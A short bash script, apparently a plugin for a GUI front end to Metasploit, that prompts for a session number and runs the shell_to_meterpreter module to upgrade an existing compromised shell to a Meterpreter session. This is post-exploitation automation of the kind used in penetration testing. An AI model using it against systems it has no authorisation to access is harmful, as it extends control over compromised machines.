#!/bin/bash

: '
meterpreter:  upgrade shell to meterpreter
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SESSION_FIELD=$(form_item  "SESSION" "number" "SESSION" "-1")

# Generate GUI form
generate_form "${SESSION_FIELD}" 

SESSION=${form_data["SESSION"]}

execute_command "use multi/manage/shell_to_meterpreter"
create_new_line
sleep 1

execute_command "set SESSION ${SESSION}"
create_new_line
sleep 0.8

execute_command "run"
create_new_line
